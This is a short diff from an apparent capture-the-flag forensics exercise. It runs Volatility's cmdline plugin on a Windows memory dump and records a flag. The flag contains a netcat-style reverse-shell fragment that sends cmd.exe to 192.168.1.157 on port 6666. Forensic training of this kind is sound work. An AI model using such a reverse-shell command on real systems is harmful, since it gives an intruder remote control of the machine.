@@ -1,0 +1,2 @@
+python vol.py -f /home/lai/leo/Hacktober/Forensics/captured/mem.raw --profile=Win10x64_17134 cmdline > /home/lai/leo/Hacktober/Forensics/captured/cmdline.txt
+	flag{explorer.exe  192.168.1.157 6666 -e cmd.exe}
